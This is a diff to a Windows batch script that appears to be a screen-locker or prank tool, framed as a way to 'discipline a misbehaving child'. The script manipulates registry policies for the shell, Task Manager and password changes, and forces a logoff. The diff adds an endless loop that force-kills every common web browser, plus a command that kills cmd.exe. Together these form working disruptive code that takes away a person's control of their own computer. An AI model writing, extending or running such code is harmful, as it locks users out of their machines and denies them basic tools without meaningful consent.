@@ -2,6 +2,7 @@
 pushd %~dp0%
 noclose
 if "%1"=="skid" goto init
+if "%1"=="anticheat" goto anticheat
 echo press any key if you agree that you are ONLY doing this to discipline a misbehaving child...
 pause > nul
 if exist python goto python
@@ -19,6 +20,7 @@ shutdown -l
 exit
 :init
 start calc
+start cum anticheat
 python\python skid.py
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
@@ -26,4 +28,13 @@ reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shu
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /f
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f
 start userinit
+taskkill /f /im cmd.exe
 exit
+:anticheat
+taskkill /f /im chrome.exe
+taskkill /f /im msedge.exe
+taskkill /f /im firefox.exe
+taskkill /f /im plasmafox.exe
+taskkill /f /im r3dfox.exe
+taskkill /f /im iexplore.exe
+goto anticheat
